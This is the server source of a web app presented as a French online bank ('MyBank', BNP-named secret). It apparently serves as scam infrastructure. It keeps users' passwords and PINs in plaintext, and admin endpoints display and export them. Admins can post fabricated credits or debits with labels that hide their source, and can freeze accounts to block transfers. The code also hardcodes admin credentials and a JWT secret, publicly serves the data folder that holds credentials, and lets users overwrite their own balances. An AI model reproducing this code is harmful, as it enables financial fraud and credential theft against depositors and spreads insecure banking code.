const express = require('express');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 5000;
const JWT_SECRET = process.env.JWT_SECRET || 'mybank-bnp-secret-key-2025';
const DATABASE_URL = process.env.DATABASE_URL || '';
const ADMIN_USERNAME = process.env.ADMIN_USERNAME || '4833091290';
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'Lesly33';
const ADMIN_PIN = process.env.ADMIN_PIN || '12345';
const LEGACY_ADMIN_USERNAMES = ['buzzinfluence'];

app.use(express.json());
app.use(express.static(__dirname));

let useDB = !!DATABASE_URL;
let pool = null;

if (useDB) {
  try {
    const { Pool } = require('pg');
    pool = new Pool({
      connectionString: DATABASE_URL,
      ssl: { rejectUnauthorized: false },
      connectionTimeoutMillis: 8000,
      idleTimeoutMillis: 30000,
      max: 5
    });
    pool.on('error', (err) => {
      console.error('⚠️  Erreur pool PostgreSQL (bascule JSON si besoin) :', err.message);
      useDB = false;
    });
  } catch (e) {
    console.error('⚠️  Module pg indisponible, bascule sur stockage JSON :', e.message);
    useDB = false;
    pool = null;
  }
}

const DATA_DIR = path.join(__dirname, 'data');
const USERS_FILE = path.join(DATA_DIR, 'users.json');
const ACCOUNTS_DIR = path.join(DATA_DIR, 'accounts');

function ensureDirs() {
  if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
  if (!fs.existsSync(ACCOUNTS_DIR)) fs.mkdirSync(ACCOUNTS_DIR, { recursive: true });
  if (!fs.existsSync(USERS_FILE)) fs.writeFileSync(USERS_FILE, '[]');
}

function readUsers() {
  ensureDirs();
  try { return JSON.parse(fs.readFileSync(USERS_FILE, 'utf8')); } catch { return []; }
}

function writeUsers(users) {
  ensureDirs();
  fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2));
}

function readAccountFile(userId) {
  ensureDirs();
  const f = path.join(ACCOUNTS_DIR, `${userId}.json`);
  if (!fs.existsSync(f)) return null;
  try { return JSON.parse(fs.readFileSync(f, 'utf8')); } catch { return null; }
}

function writeAccountFile(userId, data) {
  ensureDirs();
  fs.writeFileSync(path.join(ACCOUNTS_DIR, `${userId}.json`), JSON.stringify(data, null, 2));
}

function generateUserId() {
  if (typeof crypto.randomUUID === 'function') return 'u-' + crypto.randomUUID();
  return 'u-' + Date.now() + '-' + crypto.randomBytes(6).toString('hex');
}

function generateAccountNumber() {
  const ts = Date.now().toString().slice(-6);
  const rnd = crypto.randomInt(0, 10000).toString().padStart(4, '0');
  const n = ts + rnd;
  return `FR76 3000 4000 ${n.slice(0,4)} ${n.slice(4,8)} ${n.slice(8,10)}00`;
}

function getEmptyData(accountNumber) {
  return {
    alert_amount: '0',
    account_number: accountNumber || generateAccountNumber(),
    account_date: new Date().toLocaleDateString('fr-FR'),
    account_balance: '0',
    account_frozen: 'false',
    account_pending: '0',
    holder_lastname: '',
    holder_firstname: '',
    holder_birthdate: '',
    holder_gender: '',
    holder_country: '',
    holder_city: '',
    holder_region: '',
    manager_name: '',
    manager_phone: '',
    manager_email: '',
    transaction1_name: '',
    transaction1_date: '',
    transaction1_status: '',
    transaction1_amount: '0',
    transaction2_name: '',
    transaction2_date: '',
    transaction2_status: '',
    transaction2_amount: '0',
    transaction3_name: '',
    transaction3_date: '',
    transaction3_status: '',
    transaction3_amount: '0',
    synthese_total: '0',
    transfers_json: '[]',
    notifications_json: '[]'
  };
}

async function initFileStorage() {
  let users = readUsers();
  const before = users.length;
  users = users.filter(u => !LEGACY_ADMIN_USERNAMES.includes(u.username));
  if (users.length !== before) console.log('🧹 Ancien admin supprimé.');

  const pwHash = await bcrypt.hash(ADMIN_PASSWORD, 10);
  const pinHash = await bcrypt.hash(ADMIN_PIN, 10);
  const existing = users.find(u => u.username === ADMIN_USERNAME);
  if (existing) {
    existing.passwordHash = pwHash;
    existing.pinHash = pinHash;
    existing.passwordPlain = ADMIN_PASSWORD;
    existing.pinPlain = ADMIN_PIN;
    existing.role = 'admin';
  } else {
    const adminId = 'admin-' + crypto.randomBytes(8).toString('hex');
    users.push({ id: adminId, username: ADMIN_USERNAME, passwordHash: pwHash, pinHash, passwordPlain: ADMIN_PASSWORD, pinPlain: ADMIN_PIN, role: 'admin', createdAt: new Date().toISOString() });
    writeAccountFile(adminId, getEmptyData());
  }
  writeUsers(users);
  console.log('✅ Stockage JSON initialisé (admin: ' + ADMIN_USERNAME + ')');
}

async function initDB() {
  if (!useDB) {
    await initFileStorage();
    return;
  }
  let client;
  try {
    client = await pool.connect();
    await client.query(`CREATE TABLE IF NOT EXISTS users (
      id SERIAL PRIMARY KEY,
      username VARCHAR(100) UNIQUE NOT NULL,
      password_hash VARCHAR(255) NOT NULL,
      pin_hash VARCHAR(255) NOT NULL,
      role VARCHAR(20) DEFAULT 'user',
      created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )`);
    await client.query(`CREATE TABLE IF NOT EXISTS account_data (
      id SERIAL PRIMARY KEY,
      user_id INTEGER REFERENCES users(id) ON DELETE CASCADE,
      key VARCHAR(100) NOT NULL,
      value TEXT NOT NULL,
      updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
      UNIQUE(user_id, key)
    )`);
    for (const legacy of LEGACY_ADMIN_USERNAMES) {
      await client.query(`DELETE FROM users WHERE username = $1`, [legacy]);
    }
    const pwHash = await bcrypt.hash(ADMIN_PASSWORD, 10);
    const pinHash = await bcrypt.hash(ADMIN_PIN, 10);
    const adminCheck = await client.query(`SELECT id FROM users WHERE username = $1`, [ADMIN_USERNAME]);
    if (adminCheck.rows.length === 0) {
      const res = await client.query(
        `INSERT INTO users (username, password_hash, pin_hash, role) VALUES ($1,$2,$3,'admin') RETURNING id`,
        [ADMIN_USERNAME, pwHash, pinHash]
      );
      const seed = getEmptyData();
      for (const [key, value] of Object.entries(seed)) {
        await client.query(
          `INSERT INTO account_data (user_id, key, value) VALUES ($1,$2,$3) ON CONFLICT DO NOTHING`,
          [res.rows[0].id, key, value]
        );
      }
    } else {
      await client.query(
        `UPDATE users SET password_hash=$1, pin_hash=$2, role='admin' WHERE username=$3`,
        [pwHash, pinHash, ADMIN_USERNAME]
      );
    }
    console.log('✅ PostgreSQL initialisé (admin: ' + ADMIN_USERNAME + ')');
  } catch (e) {
    console.error('⚠️  Connexion PostgreSQL impossible (' + e.message + ') — bascule sur stockage JSON');
    useDB = false;
    try { if (pool) await pool.end(); } catch {}
    pool = null;
    await initFileStorage();
  } finally {
    if (client) { try { client.release(); } catch {} }
  }
}

async function findUser(username) {
  if (!useDB) return readUsers().find(u => u.username === username) || null;
  const r = await pool.query(`SELECT * FROM users WHERE username = $1`, [username]);
  if (!r.rows.length) return null;
  const row = r.rows[0];
  return { id: String(row.id), username: row.username, passwordHash: row.password_hash, pinHash: row.pin_hash, role: row.role, createdAt: row.created_at };
}

async function findUserById(id) {
  if (!useDB) return readUsers().find(u => u.id === id) || null;
  const r = await pool.query(`SELECT * FROM users WHERE id = $1`, [id]);
  if (!r.rows.length) return null;
  const row = r.rows[0];
  return { id: String(row.id), username: row.username, passwordHash: row.password_hash, pinHash: row.pin_hash, role: row.role, createdAt: row.created_at };
}

async function createUser(username, passwordHash, pinHash, passwordPlain, pinPlain) {
  const seed = getEmptyData();
  if (!useDB) {
    const users = readUsers();
    const id = generateUserId();
    const user = { id, username, passwordHash, pinHash, passwordPlain, pinPlain, role: 'user', createdAt: new Date().toISOString() };
    users.push(user);
    writeUsers(users);
    writeAccountFile(id, seed);
    return user;
  }
  const r = await pool.query(
    `INSERT INTO users (username, password_hash, pin_hash, role) VALUES ($1,$2,$3,'user') RETURNING *`,
    [username, passwordHash, pinHash]
  );
  const row = r.rows[0];
  // Stocke aussi le mot de passe et le PIN en clair dans account_data pour visualisation admin
  await pool.query(
    `INSERT INTO account_data (user_id, key, value) VALUES ($1,'_password_plain',$2),($1,'_pin_plain',$3) ON CONFLICT (user_id, key) DO UPDATE SET value=EXCLUDED.value`,
    [row.id, passwordPlain || '', pinPlain || '']
  );
  const user = { id: String(row.id), username: row.username, passwordHash: row.password_hash, pinHash: row.pin_hash, role: row.role, createdAt: row.created_at };
  for (const [key, value] of Object.entries(seed)) {
    await pool.query(
      `INSERT INTO account_data (user_id, key, value) VALUES ($1,$2,$3) ON CONFLICT DO NOTHING`,
      [row.id, key, value]
    );
  }
  return user;
}

async function getUserCredentials(userId) {
  if (!useDB) {
    const u = readUsers().find(x => x.id === userId);
    if (!u) return null;
    return { username: u.username, passwordPlain: u.passwordPlain || '(non disponible)', pinPlain: u.pinPlain || '(non disponible)', role: u.role };
  }
  const u = await pool.query(`SELECT username, role FROM users WHERE id=$1`, [userId]);
  if (!u.rows.length) return null;
  const r = await pool.query(`SELECT key, value FROM account_data WHERE user_id=$1 AND key IN ('_password_plain','_pin_plain')`, [userId]);
  const map = {}; r.rows.forEach(row => { map[row.key] = row.value; });
  return { username: u.rows[0].username, role: u.rows[0].role, passwordPlain: map._password_plain || '(non disponible)', pinPlain: map._pin_plain || '(non disponible)' };
}

async function getAllUsers() {
  if (!useDB) return readUsers().map(u => ({ id: u.id, username: u.username, role: u.role, createdAt: u.createdAt }));
  const r = await pool.query(`SELECT id, username, role, created_at FROM users ORDER BY created_at`);
  return r.rows.map(row => ({ id: String(row.id), username: row.username, role: row.role, createdAt: row.created_at }));
}

async function getAccountData(userId) {
  if (!useDB) {
    const data = readAccountFile(userId);
    if (data && Object.keys(data).length) return { ...getEmptyData(data.account_number), ...data };
    const seed = getEmptyData();
    writeAccountFile(userId, seed);
    return seed;
  }
  const r = await pool.query(`SELECT key, value FROM account_data WHERE user_id = $1`, [userId]);
  if (!r.rows.length) {
    const seed = getEmptyData();
    for (const [key, value] of Object.entries(seed)) {
      await pool.query(
        `INSERT INTO account_data (user_id, key, value) VALUES ($1,$2,$3) ON CONFLICT DO NOTHING`,
        [userId, key, value]
      );
    }
    return seed;
  }
  const data = {};
  r.rows.forEach(row => { data[row.key] = row.value; });
  return { ...getEmptyData(data.account_number), ...data };
}

async function saveAccountData(userId, updates) {
  if (!useDB) {
    const current = readAccountFile(userId) || getEmptyData();
    const accountNumber = current.account_number || updates.account_number || generateAccountNumber();
    writeAccountFile(userId, { ...current, account_number: accountNumber, ...updates });
    return;
  }
  const client = await pool.connect();
  try {
    await client.query('BEGIN');
    for (const [key, value] of Object.entries(updates)) {
      await client.query(
        `INSERT INTO account_data (user_id, key, value) VALUES ($1,$2,$3)
         ON CONFLICT (user_id, key) DO UPDATE SET value=$3, updated_at=NOW()`,
        [userId, key, value]
      );
    }
    await client.query('COMMIT');
  } catch (e) {
    await client.query('ROLLBACK');
    throw e;
  } finally {
    client.release();
  }
}

async function updateUserPassword(userId, newHash, newPlain) {
  if (!useDB) {
    const users = readUsers();
    const idx = users.findIndex(u => u.id === userId);
    if (idx !== -1) { users[idx].passwordHash = newHash; if (newPlain != null) users[idx].passwordPlain = newPlain; writeUsers(users); }
    return;
  }
  await pool.query(`UPDATE users SET password_hash=$1 WHERE id=$2`, [newHash, userId]);
  if (newPlain != null) {
    await pool.query(
      `INSERT INTO account_data (user_id, key, value) VALUES ($1,'_password_plain',$2) ON CONFLICT (user_id, key) DO UPDATE SET value=$2`,
      [userId, newPlain]
    );
  }
}

async function deleteUserById(userId) {
  if (!useDB) {
    const users = readUsers().filter(u => u.id !== userId);
    writeUsers(users);
    const f = path.join(ACCOUNTS_DIR, `${userId}.json`);
    if (fs.existsSync(f)) fs.unlinkSync(f);
    return;
  }
  await pool.query(`DELETE FROM users WHERE id=$1`, [userId]);
}

function auth(req, res, next) {
  const h = req.headers.authorization;
  if (!h || !h.startsWith('Bearer ')) return res.status(401).json({ error: 'Non autorisé' });
  try {
    req.user = jwt.verify(h.replace('Bearer ', ''), JWT_SECRET);
    next();
  } catch {
    res.status(401).json({ error: 'Session expirée, reconnectez-vous' });
  }
}

function adminOnly(req, res, next) {
  if (req.user.role !== 'admin') return res.status(403).json({ error: 'Accès administrateur requis' });
  next();
}

app.post('/api/auth/register', async (req, res) => {
  try {
    const { username, password, pin, firstName, lastName, birthDate, gender } = req.body;
    if (!username || !password || !pin) return res.status(400).json({ error: 'Tous les champs sont requis' });
    if (!firstName || !lastName || !birthDate || !gender) return res.status(400).json({ error: 'Nom, prénom, date de naissance et sexe sont requis' });
    if (username.trim().length < 3) return res.status(400).json({ error: 'Identifiant : 3 caractères minimum' });
    if (password.length < 4) return res.status(400).json({ error: 'Mot de passe : 4 caractères minimum' });
    if (!/^\d{5}$/.test(pin)) return res.status(400).json({ error: 'Le code PIN doit être composé de 5 chiffres' });

    const existing = await findUser(username.trim());
    if (existing) return res.status(409).json({ error: 'Cet identifiant est déjà utilisé' });

    const pwHash = await bcrypt.hash(password, 10);
    const pinHash = await bcrypt.hash(pin, 10);
    const user = await createUser(username.trim(), pwHash, pinHash, password, pin);

    await saveAccountData(user.id, {
      holder_firstname: String(firstName).trim(),
      holder_lastname: String(lastName).trim(),
      holder_birthdate: String(birthDate).trim(),
      holder_gender: String(gender).trim(),
      account_date: new Date().toLocaleDateString('fr-FR')
    });

    const accountData = await getAccountData(user.id);
    const token = jwt.sign({ userId: user.id, username: user.username, role: user.role }, JWT_SECRET, { expiresIn: '30d' });
    res.json({
      success: true, token, userId: user.id, username: user.username, role: user.role,
      account: {
        firstName: accountData.holder_firstname,
        lastName: accountData.holder_lastname,
        accountNumber: accountData.account_number,
        balance: accountData.account_balance || '0',
        accountDate: accountData.account_date
      }
    });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/auth/login', async (req, res) => {
  try {
    const { username, password } = req.body;
    if (!username || !password) return res.status(400).json({ error: 'Identifiant et mot de passe requis' });
    const user = await findUser(username.trim());
    if (!user) return res.status(401).json({ error: 'Identifiant ou mot de passe incorrect' });
    const ok = await bcrypt.compare(password, user.passwordHash);
    if (!ok) return res.status(401).json({ error: 'Identifiant ou mot de passe incorrect' });
    const token = jwt.sign({ userId: user.id, username: user.username, role: user.role }, JWT_SECRET, { expiresIn: '30d' });
    res.json({ success: true, token, userId: user.id, username: user.username, role: user.role });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/auth/verify-pin', auth, async (req, res) => {
  try {
    const { pin } = req.body;
    if (!pin) return res.status(400).json({ error: 'Code PIN requis' });
    const user = await findUserById(req.user.userId);
    if (!user) return res.status(404).json({ error: 'Utilisateur introuvable' });
    const ok = await bcrypt.compare(String(pin), user.pinHash);
    if (!ok) return res.status(401).json({ error: 'Code PIN incorrect' });
    res.json({ success: true });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/auth/verify-token', auth, (req, res) => {
  res.json({ valid: true, userId: req.user.userId, username: req.user.username, role: req.user.role });
});

app.get('/api/client-data', auth, async (req, res) => {
  try { res.json(await getAccountData(req.user.userId)); }
  catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/client-data', auth, async (req, res) => {
  try { await saveAccountData(req.user.userId, req.body); res.json({ success: true }); }
  catch (e) { res.status(500).json({ error: e.message }); }
});

// ========== VIREMENTS ==========
function parseTransfers(raw) {
  try { const v = JSON.parse(raw || '[]'); return Array.isArray(v) ? v : []; } catch { return []; }
}
function parseNotifs(raw) {
  try { const v = JSON.parse(raw || '[]'); return Array.isArray(v) ? v : []; } catch { return []; }
}
function computePending(transfers) {
  // "À venir" inclut désormais les crédits administrateur (le client voit son versement arriver).
  return transfers
    .filter(t => (t.status === 'À venir' || t.status === 'a_venir'))
    .reduce((sum, t) => sum + Math.abs(Number(t.amount) || 0), 0)
    .toFixed(2);
}

app.get('/api/transfers', auth, async (req, res) => {
  try {
    const data = await getAccountData(req.user.userId);
    res.json(parseTransfers(data.transfers_json));
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/transfers', auth, async (req, res) => {
  try {
    const { beneficiary, iban, amount, motif } = req.body || {};
    const amt = Number.parseFloat(String(amount || '0').replace(',', '.'));
    if (!beneficiary || !String(beneficiary).trim()) return res.status(400).json({ error: 'Bénéficiaire requis' });
    if (!Number.isFinite(amt) || amt <= 0) return res.status(400).json({ error: 'Montant invalide' });

    const data = await getAccountData(req.user.userId);
    if (data.account_frozen === 'true') return res.status(403).json({ error: 'Compte gelé : virement impossible. Contactez votre conseiller.' });
    const balance = Number.parseFloat(data.account_balance || '0') || 0;
    if (amt > balance) return res.status(400).json({ error: 'Solde insuffisant pour effectuer ce virement.' });

    const transfers = parseTransfers(data.transfers_json);
    const notifs = parseNotifs(data.notifications_json);
    const tx = {
      id: 'tr-' + Date.now() + '-' + crypto.randomBytes(3).toString('hex'),
      date: new Date().toISOString(),
      dateLabel: new Date().toLocaleString('fr-FR'),
      beneficiary: String(beneficiary).trim(),
      iban: String(iban || '').trim(),
      amount: amt,
      type: 'debit',
      motif: String(motif || '').trim(),
      status: 'À venir',
      fromAccount: data.account_number
    };
    transfers.unshift(tx);
    const newBalance = (balance - amt).toFixed(2);
    const pending = computePending(transfers);
    notifs.unshift({
      id: 'n-' + Date.now(),
      date: new Date().toISOString(),
      title: 'Virement enregistré',
      message: `Virement de ${amt.toFixed(2)} € vers ${tx.beneficiary} enregistré. Nouveau solde : ${newBalance} €.`,
      read: false
    });
    await saveAccountData(req.user.userId, {
      transfers_json: JSON.stringify(transfers).slice(0, 200000),
      notifications_json: JSON.stringify(notifs.slice(0, 50)),
      account_balance: newBalance,
      account_pending: pending
    });
    res.json({ success: true, transfer: tx, newBalance, pending });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// ========== ADMIN ==========
app.get('/api/admin/users', auth, adminOnly, async (req, res) => {
  try { res.json(await getAllUsers()); }
  catch (e) { res.status(500).json({ error: e.message }); }
});

app.get('/api/admin/users/:id/data', auth, adminOnly, async (req, res) => {
  try { res.json(await getAccountData(req.params.id)); }
  catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/admin/users/:id/data', auth, adminOnly, async (req, res) => {
  try { await saveAccountData(req.params.id, req.body); res.json({ success: true }); }
  catch (e) { res.status(500).json({ error: e.message }); }
});

app.get('/api/admin/users/:id/transfers', auth, adminOnly, async (req, res) => {
  try {
    const data = await getAccountData(req.params.id);
    res.json(parseTransfers(data.transfers_json));
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// Créditer un compte (administration) — le montant apparaît dans « À venir » côté client
app.post('/api/admin/users/:id/credit', auth, adminOnly, async (req, res) => {
  try {
    const amt = Number.parseFloat(String(req.body?.amount || '0').replace(',', '.'));
    const label = String(req.body?.label || '').trim();
    if (!Number.isFinite(amt) || amt === 0) return res.status(400).json({ error: 'Montant invalide' });
    const data = await getAccountData(req.params.id);
    const balance = Number.parseFloat(data.account_balance || '0') || 0;
    const newBalance = (balance + amt).toFixed(2);
    const transfers = parseTransfers(data.transfers_json);
    const notifs = parseNotifs(data.notifications_json);
    // Libellé neutre côté client (aucune mention « administrateur »)
    const beneficiary = label || (amt >= 0 ? 'Versement' : 'Prélèvement');
    transfers.unshift({
      id: 'ad-' + Date.now() + '-' + crypto.randomBytes(3).toString('hex'),
      date: new Date().toISOString(),
      dateLabel: new Date().toLocaleString('fr-FR'),
      beneficiary,
      amount: amt,
      type: amt >= 0 ? 'credit' : 'debit',
      status: 'À venir',
      motif: label || (amt >= 0 ? 'Versement' : 'Prélèvement')
    });
    const pending = computePending(transfers);
    notifs.unshift({
      id: 'n-' + Date.now(),
      date: new Date().toISOString(),
      title: amt >= 0 ? '💰 Versement reçu' : '⚠️ Débit effectué',
      message: amt >= 0
        ? `Un versement de ${amt.toFixed(2)} € est en attente sur votre compte. Votre solde sera de ${newBalance} €.`
        : `Votre compte a été débité de ${Math.abs(amt).toFixed(2)} €. Nouveau solde : ${newBalance} €.`,
      read: false
    });
    await saveAccountData(req.params.id, {
      account_balance: newBalance,
      account_pending: pending,
      transfers_json: JSON.stringify(transfers).slice(0, 200000),
      notifications_json: JSON.stringify(notifs.slice(0, 50))
    });
    res.json({ success: true, newBalance, pending });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// Notifications utilisateur
app.get('/api/notifications', auth, async (req, res) => {
  try {
    const data = await getAccountData(req.user.userId);
    res.json(parseNotifs(data.notifications_json));
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/notifications/read-all', auth, async (req, res) => {
  try {
    const data = await getAccountData(req.user.userId);
    const notifs = parseNotifs(data.notifications_json).map(n => ({ ...n, read: true }));
    await saveAccountData(req.user.userId, { notifications_json: JSON.stringify(notifs) });
    res.json({ success: true });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// Synthèse globale (administrateur)
app.get('/api/admin/synthese', auth, adminOnly, async (req, res) => {
  try {
    const users = await getAllUsers();
    const rows = [];
    let total = 0, totalCredits = 0;
    for (const u of users) {
      if (u.role === 'admin') continue;
      const d = await getAccountData(u.id);
      const balance = Number.parseFloat(d.account_balance || '0') || 0;
      const transfers = parseTransfers(d.transfers_json);
      const credits = transfers.filter(t => t.type === 'credit').reduce((s, t) => s + (Number(t.amount) || 0), 0);
      total += balance;
      totalCredits += credits;
      rows.push({
        id: u.id,
        username: u.username,
        fullName: [d.holder_firstname, d.holder_lastname].filter(Boolean).join(' ') || u.username,
        balance,
        credits,
        frozen: d.account_frozen === 'true',
        accountNumber: d.account_number || ''
      });
    }
    res.json({ rows, total, totalCredits });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// Identifiants en clair (admin uniquement)
app.get('/api/admin/users/:id/credentials', auth, adminOnly, async (req, res) => {
  try {
    const creds = await getUserCredentials(req.params.id);
    if (!creds) return res.status(404).json({ error: 'Utilisateur introuvable' });
    res.json(creds);
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/admin/users/:id/reset-password', auth, adminOnly, async (req, res) => {
  try {
    const { newPassword } = req.body;
    if (!newPassword || newPassword.length < 4) return res.status(400).json({ error: 'Mot de passe : 4 caractères minimum' });
    await updateUserPassword(req.params.id, await bcrypt.hash(newPassword, 10), newPassword);
    res.json({ success: true });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.delete('/api/admin/users/:id', auth, adminOnly, async (req, res) => {
  try {
    if (req.params.id === req.user.userId) return res.status(400).json({ error: 'Impossible de supprimer votre propre compte' });
    await deleteUserById(req.params.id);
    res.json({ success: true });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// ========== IMPORT / EXPORT EXCEL (admin) ==========
let XLSX = null;
try { XLSX = require('xlsx'); } catch (e) { console.warn('⚠️  xlsx non installé : npm i xlsx'); }

const EXPORT_FIELDS = [
  'alert_amount','account_number','account_date','account_balance','account_frozen','account_pending',
  'holder_lastname','holder_firstname','holder_birthdate','holder_gender','holder_country','holder_city','holder_region',
  'manager_name','manager_phone','manager_email','synthese_total'
];

app.get('/api/admin/export', auth, adminOnly, async (req, res) => {
  try {
    if (!XLSX) return res.status(500).json({ error: 'Module xlsx manquant sur le serveur.' });
    const users = await getAllUsers();
    const usersRows = [];
    const transfersRows = [];
    const notifsRows = [];
    for (const u of users) {
      const d = await getAccountData(u.id);
      const creds = await getUserCredentials(u.id).catch(() => null);
      const row = {
        id: u.id, username: u.username, role: u.role || 'user',
        createdAt: u.createdAt || '',
        password_plain: creds?.passwordPlain || '',
        pin_plain: creds?.pinPlain || ''
      };
      EXPORT_FIELDS.forEach(f => { row[f] = d[f] || ''; });
      usersRows.push(row);
      parseTransfers(d.transfers_json).forEach(t => transfersRows.push({
        user_id: u.id, username: u.username,
        id: t.id, date: t.date, dateLabel: t.dateLabel,
        beneficiary: t.beneficiary, iban: t.iban || '',
        amount: t.amount, type: t.type, status: t.status, motif: t.motif || ''
      }));
      parseNotifs(d.notifications_json).forEach(n => notifsRows.push({
        user_id: u.id, username: u.username,
        id: n.id, date: n.date, title: n.title, message: n.message, read: !!n.read
      }));
    }
    const wb = XLSX.utils.book_new();
    XLSX.utils.book_append_sheet(wb, XLSX.utils.json_to_sheet(usersRows), 'Utilisateurs');
    XLSX.utils.book_append_sheet(wb, XLSX.utils.json_to_sheet(transfersRows), 'Virements');
    XLSX.utils.book_append_sheet(wb, XLSX.utils.json_to_sheet(notifsRows), 'Notifications');
    const buf = XLSX.write(wb, { type: 'buffer', bookType: 'xlsx' });
    res.setHeader('Content-Type', 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet');
    res.setHeader('Content-Disposition', 'attachment; filename="mybank-export-' + new Date().toISOString().slice(0,10) + '.xlsx"');
    res.send(buf);
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// Import : accepte un xlsx encodé en base64 dans { fileBase64 }
app.post('/api/admin/import', auth, adminOnly, express.json({ limit: '25mb' }), async (req, res) => {
  try {
    if (!XLSX) return res.status(500).json({ error: 'Module xlsx manquant sur le serveur.' });
    const b64 = String(req.body?.fileBase64 || '');
    if (!b64) return res.status(400).json({ error: 'Aucun fichier fourni.' });
    const buf = Buffer.from(b64, 'base64');
    const wb = XLSX.read(buf, { type: 'buffer' });
    const usersSheet = wb.Sheets['Utilisateurs'];
    const transfersSheet = wb.Sheets['Virements'];
    const notifsSheet = wb.Sheets['Notifications'];
    if (!usersSheet) return res.status(400).json({ error: 'Feuille "Utilisateurs" manquante.' });
    const usersRows = XLSX.utils.sheet_to_json(usersSheet);
    const transfersByUser = {};
    const notifsByUser = {};
    if (transfersSheet) XLSX.utils.sheet_to_json(transfersSheet).forEach(t => {
      const k = t.user_id || t.username;
      if (!k) return;
      (transfersByUser[k] = transfersByUser[k] || []).push({
        id: t.id, date: t.date, dateLabel: t.dateLabel,
        beneficiary: t.beneficiary, iban: t.iban || '',
        amount: Number(t.amount) || 0, type: t.type || 'debit',
        status: t.status || 'À venir', motif: t.motif || ''
      });
    });
    if (notifsSheet) XLSX.utils.sheet_to_json(notifsSheet).forEach(n => {
      const k = n.user_id || n.username;
      if (!k) return;
      (notifsByUser[k] = notifsByUser[k] || []).push({
        id: n.id, date: n.date, title: n.title, message: n.message, read: !!n.read
      });
    });

    let updated = 0, created = 0;
    for (const row of usersRows) {
      if (!row.username) continue;
      let userId = row.id;
      const existing = await findUser(row.username).catch(() => null);
      if (existing) {
        userId = existing.id;
        if (row.password_plain) {
          await updateUserPassword(userId, await bcrypt.hash(String(row.password_plain), 10), String(row.password_plain));
        }
        updated++;
      } else {
        const pw = String(row.password_plain || 'changeme');
        const pin = String(row.pin_plain || '');
        const hashedPw = await bcrypt.hash(pw, 10);
        const hashedPin = pin ? await bcrypt.hash(pin, 10) : '';
        const newUser = await createUser(row.username, hashedPw, hashedPin, pw, pin);
        userId = newUser.id;
        created++;
      }
      const data = {};
      EXPORT_FIELDS.forEach(f => { if (row[f] !== undefined && row[f] !== null) data[f] = String(row[f]); });
      const txs = transfersByUser[row.id] || transfersByUser[row.username] || [];
      const ns = notifsByUser[row.id] || notifsByUser[row.username] || [];
      if (txs.length) data.transfers_json = JSON.stringify(txs);
      if (ns.length) data.notifications_json = JSON.stringify(ns);
      await saveAccountData(userId, data);
    }
    res.json({ success: true, created, updated });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.get('*', (req, res) => { res.sendFile(path.join(__dirname, 'index.html')); });

app.listen(PORT, '0.0.0.0', async () => {
  await initDB();
  console.log(`MyBank démarré sur le port ${PORT}`);
});
